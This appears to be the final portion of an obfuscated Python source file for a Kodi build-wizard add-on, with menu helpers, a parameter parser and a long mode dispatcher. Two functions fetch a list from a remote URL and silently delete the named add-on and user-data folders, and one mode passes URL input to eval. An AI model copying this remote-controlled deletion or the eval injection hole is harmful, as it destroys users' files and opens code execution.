	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6134
def testupdate ():#line:6136
	if BUILDNAME =="":#line:6137
		notify .updateWindow ()#line:6138
	else :#line:6139
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6140
def testfirst ():#line:6142
	notify .firstRun ()#line:6143
def testfirstRun ():#line:6145
	notify .firstRunSettings ()#line:6146
def fastinstall ():#line:6149
	notify .firstRuninstall ()#line:6150
def addDir (OO0O00OO00OO0O000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6157
	OO000O000O00O0O0O =sys .argv [0 ]#line:6158
	if not mode ==None :OO000O000O00O0O0O +="?mode=%s"%urllib .quote_plus (mode )#line:6159
	if not name ==None :OO000O000O00O0O0O +="&name="+urllib .quote_plus (name )#line:6160
	if not url ==None :OO000O000O00O0O0O +="&url="+urllib .quote_plus (url )#line:6161
	O00O0OO0000O000OO =True #line:6162
	if themeit :OO0O00OO00OO0O000 =themeit %OO0O00OO00OO0O000 #line:6163
	OO00OO0O0O00O00OO =xbmcgui .ListItem (OO0O00OO00OO0O000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6164
	OO00OO0O0O00O00OO .setInfo (type ="Video",infoLabels ={"Title":OO0O00OO00OO0O000 ,"Plot":description })#line:6165
	OO00OO0O0O00O00OO .setProperty ("Fanart_Image",fanart )#line:6166
	if not menu ==None :OO00OO0O0O00O00OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:6167
	O00O0OO0000O000OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO000O000O00O0O0O ,listitem =OO00OO0O0O00O00OO ,isFolder =True )#line:6168
	return O00O0OO0000O000OO #line:6169
def addFile (OO00OOO00000O0O00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6171
	OOO0000O00O0OOOOO =sys .argv [0 ]#line:6172
	if not mode ==None :OOO0000O00O0OOOOO +="?mode=%s"%urllib .quote_plus (mode )#line:6173
	if not name ==None :OOO0000O00O0OOOOO +="&name="+urllib .quote_plus (name )#line:6174
	if not url ==None :OOO0000O00O0OOOOO +="&url="+urllib .quote_plus (url )#line:6175
	OO00000000OO000OO =True #line:6176
	if themeit :OO00OOO00000O0O00 =themeit %OO00OOO00000O0O00 #line:6177
	O0000000O00O00OO0 =xbmcgui .ListItem (OO00OOO00000O0O00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6178
	O0000000O00O00OO0 .setInfo (type ="Video",infoLabels ={"Title":OO00OOO00000O0O00 ,"Plot":description })#line:6179
	O0000000O00O00OO0 .setProperty ("Fanart_Image",fanart )#line:6180
	if not menu ==None :O0000000O00O00OO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6181
	OO00000000OO000OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0000O00O0OOOOO ,listitem =O0000000O00O00OO0 ,isFolder =False )#line:6182
	return OO00000000OO000OO #line:6183
def get_params ():#line:6185
	OO0O000O0O000OOO0 =[]#line:6186
	OOOO0O00O000O0OOO =sys .argv [2 ]#line:6187
	if len (OOOO0O00O000O0OOO )>=2 :#line:6188
		OOOO0OO0000O00000 =sys .argv [2 ]#line:6189
		OO00OOOO0OOO0000O =OOOO0OO0000O00000 .replace ('?','')#line:6190
		if (OOOO0OO0000O00000 [len (OOOO0OO0000O00000 )-1 ]=='/'):#line:6191
			OOOO0OO0000O00000 =OOOO0OO0000O00000 [0 :len (OOOO0OO0000O00000 )-2 ]#line:6192
		OO00000OO00OO0000 =OO00OOOO0OOO0000O .split ('&')#line:6193
		OO0O000O0O000OOO0 ={}#line:6194
		for OO0OO000O000O0O00 in range (len (OO00000OO00OO0000 )):#line:6195
			OO00O0OOO0O0OOO00 ={}#line:6196
			OO00O0OOO0O0OOO00 =OO00000OO00OO0000 [OO0OO000O000O0O00 ].split ('=')#line:6197
			if (len (OO00O0OOO0O0OOO00 ))==2 :#line:6198
				OO0O000O0O000OOO0 [OO00O0OOO0O0OOO00 [0 ]]=OO00O0OOO0O0OOO00 [1 ]#line:6199
		return OO0O000O0O000OOO0 #line:6201
def remove_addons ():#line:6203
	try :#line:6204
			import json #line:6205
			OOO0O0OO000OO0O00 =urllib2 .urlopen (remove_url ).readlines ()#line:6206
			for OOOO0O000O0O00000 in OOO0O0OO000OO0O00 :#line:6207
				O0000OOO00O0O0OOO =OOOO0O000O0O00000 .split (':')[1 ].strip ()#line:6209
				OOO00O00OO0OO0OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0000OOO00O0O0OOO ,'false')#line:6210
				OOOOO0O0O0O000OO0 =xbmc .executeJSONRPC (OOO00O00OO0OO0OO0 )#line:6211
				O0000O0OOO0O00O0O =json .loads (OOOOO0O0O0O000OO0 )#line:6212
				OO0OOOOO0O00OO000 =os .path .join (addons_folder ,O0000OOO00O0O0OOO )#line:6214
				if os .path .exists (OO0OOOOO0O00OO000 ):#line:6216
					for O0O00000OO0OOO00O ,OOO0OO0O0O00O0OO0 ,O00000OO0OO0OOO0O in os .walk (OO0OOOOO0O00OO000 ):#line:6217
						for O00O0O00O00000O0O in O00000OO0OO0OOO0O :#line:6218
							os .unlink (os .path .join (O0O00000OO0OOO00O ,O00O0O00O00000O0O ))#line:6219
						for OOOO0OOO00OOO00O0 in OOO0OO0O0O00O0OO0 :#line:6220
							shutil .rmtree (os .path .join (O0O00000OO0OOO00O ,OOOO0OOO00OOO00O0 ))#line:6221
					os .rmdir (OO0OOOOO0O00OO000 )#line:6222
			xbmc .executebuiltin ('Container.Refresh')#line:6224
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6225
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6226
	except :pass #line:6227
def remove_addons2 ():#line:6228
	try :#line:6229
			import json #line:6230
			O0OO000O0O0OO00OO =urllib2 .urlopen (remove_url2 ).readlines ()#line:6231
			for OO0O0O0O0000O0OO0 in O0OO000O0O0OO00OO :#line:6232
				OOOO00OO00OO0O0OO =OO0O0O0O0000O0OO0 .split (':')[1 ].strip ()#line:6234
				O0O0OOOOO0O00OO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOOO00OO00OO0O0OO ,'false')#line:6235
				O00O0000OO0OOO0O0 =xbmc .executeJSONRPC (O0O0OOOOO0O00OO00 )#line:6236
				O0OO0OOO000000OOO =json .loads (O00O0000OO0OOO0O0 )#line:6237
				O0O0O0O00OO0OOO00 =os .path .join (user_folder ,OOOO00OO00OO0O0OO )#line:6239
				if os .path .exists (O0O0O0O00OO0OOO00 ):#line:6241
					for OOO00O00OO0O00000 ,OO0000000OO0000O0 ,OO000000000O000O0 in os .walk (O0O0O0O00OO0OOO00 ):#line:6242
						for O00O00O0OO00O000O in OO000000000O000O0 :#line:6243
							os .unlink (os .path .join (OOO00O00OO0O00000 ,O00O00O0OO00O000O ))#line:6244
						for O0OO0O00OO0OO0O0O in OO0000000OO0000O0 :#line:6245
							shutil .rmtree (os .path .join (OOO00O00OO0O00000 ,O0OO0O00OO0OO0O0O ))#line:6246
					os .rmdir (O0O0O0O00OO0OOO00 )#line:6247
	except :pass #line:6249
params =get_params ()#line:6250
url =None #line:6251
name =None #line:6252
mode =None #line:6253
try :mode =urllib .unquote_plus (params ["mode"])#line:6255
except :pass #line:6256
try :name =urllib .unquote_plus (params ["name"])#line:6257
except :pass #line:6258
try :url =urllib .unquote_plus (params ["url"])#line:6259
except :pass #line:6260
def setView (OOOOO000O00OO0000 ,O000OOOO00O000OOO ):#line:6264
	if wiz .getS ('auto-view')=='true':#line:6265
		OOOO0OOO0OOOO00OO =wiz .getS (O000OOOO00O000OOO )#line:6266
		if OOOO0OOO0OOOO00OO =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOO0OOO0OOOO00OO ='55'#line:6267
		if OOOO0OOO0OOOO00OO =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOO0OOO0OOOO00OO ='50'#line:6268
		wiz .ebi ("Container.SetViewMode(%s)"%OOOO0OOO0OOOO00OO )#line:6269
if mode ==None :index ()#line:6271
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6273
elif mode =='builds':buildMenu ()#line:6274
elif mode =='viewbuild':viewBuild (name )#line:6275
elif mode =='buildinfo':buildInfo (name )#line:6276
elif mode =='buildpreview':buildVideo (name )#line:6277
elif mode =='install':buildWizard (name ,url )#line:6278
elif mode =='theme':buildWizard (name ,mode ,url )#line:6279
elif mode =='viewthirdparty':viewThirdList (name )#line:6280
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6281
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6282
elif mode =='maint':maintMenu (name )#line:6284
elif mode =='passpin':passandpin ()#line:6285
elif mode =='backmyupbuild':backmyupbuild ()#line:6286
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6287
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6288
elif mode =='advancedsetting':advancedWindow (name )#line:6289
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6290
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6291
elif mode =='asciicheck':wiz .asciiCheck ()#line:6292
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6293
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6294
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6295
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6296
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6297
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6298
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6299
elif mode =='currentsettings':viewAdvanced ()#line:6300
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6301
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6302
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6303
elif mode =='fixskin':backtokodi ()#line:6304
elif mode =='testcommand':updatetelemedia (NOTEID )#line:6305
elif mode =='logsend':logsend ()#line:6306
elif mode =='rdon':rdon ()#line:6307
elif mode =='rdoff':rdoff ()#line:6308
elif mode =='setrd':setrealdebrid ()#line:6309
elif mode =='setrd2':setautorealdebrid ()#line:6310
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6311
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6312
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6313
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6314
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6315
elif mode =='freshstart':freshStart ()#line:6316
elif mode =='forceupdate':wiz .forceUpdate ()#line:6317
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6318
elif mode =='forceclose':wiz .killxbmc ()#line:6319
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6320
elif mode =='hidepassword':wiz .hidePassword ()#line:6321
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6322
elif mode =='enableaddons':enableAddons ()#line:6323
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6324
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6325
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6326
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6327
elif mode =='uploadlog':uploadLog .Main ()#line:6328
elif mode =='viewlog':LogViewer ()#line:6329
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6330
elif mode =='viewerrorlog':errorChecking (all =True )#line:6331
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6332
elif mode =='purgedb':purgeDb ()#line:6333
elif mode =='fixaddonupdate':fixUpdate ()#line:6334
elif mode =='removeaddons':removeAddonMenu ()#line:6335
elif mode =='removeaddon':removeAddon (name )#line:6336
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6337
elif mode =='removedata':removeAddonData (name )#line:6338
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6339
elif mode =='systeminfo':systemInfo ()#line:6340
elif mode =='restorezip':restoreit ('build')#line:6341
elif mode =='restoregui':restoreit ('gui')#line:6342
elif mode =='restoreaddon':restoreit ('addondata')#line:6343
elif mode =='restoreextzip':restoreextit ('build')#line:6344
elif mode =='restoreextgui':restoreextit ('gui')#line:6345
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6346
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6347
elif mode =='traktsync':traktsync ()#line:6348
elif mode =='apk':apkMenu (name )#line:6350
elif mode =='apkscrape':apkScraper (name )#line:6351
elif mode =='apkinstall':apkInstaller (name ,url )#line:6352
elif mode =='speed':speedMenu ()#line:6353
elif mode =='net':net_tools ()#line:6354
elif mode =='GetList':GetList (url )#line:6355
elif mode =='youtube':youtubeMenu (name )#line:6356
elif mode =='viewVideo':playVideo (url )#line:6357
elif mode =='addons':addonMenu (name )#line:6359
elif mode =='addoninstall':addonInstaller (name ,url )#line:6360
elif mode =='savedata':saveMenu ()#line:6362
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6363
elif mode =='managedata':manageSaveData (name )#line:6364
elif mode =='whitelist':wiz .whiteList (name )#line:6365
elif mode =='trakt':traktMenu ()#line:6367
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6368
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6369
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6370
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6371
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6372
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6373
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6374
elif mode =='realdebrid':realMenu ()#line:6376
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6377
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6378
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6379
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6380
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6381
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6382
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6383
elif mode =='login':loginMenu ()#line:6385
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6386
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6387
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6388
elif mode =='clearlogin':loginit .clearSaved (name )#line:6389
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6390
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6391
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6392
elif mode =='contact':notify .contact (CONTACT )#line:6394
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6395
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6396
elif mode =='developer':developer ()#line:6398
elif mode =='converttext':wiz .convertText ()#line:6399
elif mode =='createqr':wiz .createQR ()#line:6400
elif mode =='testnotify':testnotify ()#line:6401
elif mode =='testnotify2':testnotify2 ()#line:6402
elif mode =='servicemanual':servicemanual ()#line:6403
elif mode =='fastinstall':fastinstall ()#line:6404
elif mode =='testupdate':testupdate ()#line:6405
elif mode =='testfirst':testfirst ()#line:6406
elif mode =='testfirstrun':testfirstRun ()#line:6407
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6408
elif mode =='bg':wiz .bg_install (name ,url )#line:6410
elif mode =='bgcustom':wiz .bg_custom ()#line:6411
elif mode =='bgremove':wiz .bg_remove ()#line:6412
elif mode =='bgdefault':wiz .bg_default ()#line:6413
elif mode =='rdset':rdsetup ()#line:6414
elif mode =='mor':morsetup ()#line:6415
elif mode =='mor2':morsetup2 ()#line:6416
elif mode =='resolveurl':resolveurlsetup ()#line:6417
elif mode =='urlresolver':urlresolversetup ()#line:6418
elif mode =='forcefastupdate':forcefastupdate ()#line:6419
elif mode =='traktset':traktsetup ()#line:6420
elif mode =='placentaset':placentasetup ()#line:6421
elif mode =='flixnetset':flixnetsetup ()#line:6422
elif mode =='reptiliaset':reptiliasetup ()#line:6423
elif mode =='yodasset':yodasetup ()#line:6424
elif mode =='numbersset':numberssetup ()#line:6425
elif mode =='uranusset':uranussetup ()#line:6426
elif mode =='genesisset':genesissetup ()#line:6427
elif mode =='fastupdate':fastupdate ()#line:6428
elif mode =='folderback':folderback ()#line:6429
elif mode =='menudata':Menu ()#line:6430
elif mode =='infoupdate':infobuild ()#line:6431
elif mode =='wait':wait ()#line:6432
elif mode ==2 :#line:6433
        wiz .torent_menu ()#line:6434
elif mode ==3 :#line:6435
        wiz .popcorn_menu ()#line:6436
elif mode ==8 :#line:6437
        wiz .metaliq_fix ()#line:6438
elif mode ==9 :#line:6439
        wiz .quasar_menu ()#line:6440
elif mode ==5 :#line:6441
        swapSkins ('skin.Premium.mod')#line:6442
elif mode ==13 :#line:6443
        wiz .elementum_menu ()#line:6444
elif mode ==16 :#line:6445
        wiz .fix_wizard ()#line:6446
elif mode ==17 :#line:6447
        wiz .last_play ()#line:6448
elif mode ==18 :#line:6449
        wiz .normal_metalliq ()#line:6450
elif mode ==19 :#line:6451
        wiz .fast_metalliq ()#line:6452
elif mode ==20 :#line:6453
        wiz .fix_buffer2 ()#line:6454
elif mode ==21 :#line:6455
        wiz .fix_buffer3 ()#line:6456
elif mode ==11 :#line:6457
        wiz .fix_buffer ()#line:6458
elif mode ==15 :#line:6459
        wiz .fix_font ()#line:6460
elif mode ==14 :#line:6461
        wiz .clean_pass ()#line:6462
elif mode ==22 :#line:6463
        wiz .movie_update ()#line:6464
elif mode =='simpleiptv':#line:6467
    DIALOG =xbmcgui .Dialog ()#line:6469
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6470
    if choice ==1 :#line:6471
        iptvkodi17_18 ()#line:6472
    else :#line:6474
     sys .exit ()#line:6475
elif mode =='simpleidanplus':#line:6477
    DIALOG =xbmcgui .Dialog ()#line:6478
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6479
    if choice ==1 :#line:6480
        iptvidanplus ()#line:6481
    else :#line:6483
     sys .exit ()#line:6484
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6486
elif mode =='adv_settings':buffer1 ()#line:6487
elif mode =='getpass':getpass ()#line:6488
elif mode =='setpass':setpass ()#line:6489
elif mode =='setuname':setuname ()#line:6490
elif mode =='passandUsername':passandUsername ()#line:6491
elif mode =='9':disply_hwr ()#line:6492
elif mode =='99':disply_hwr2 ()#line:6493
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))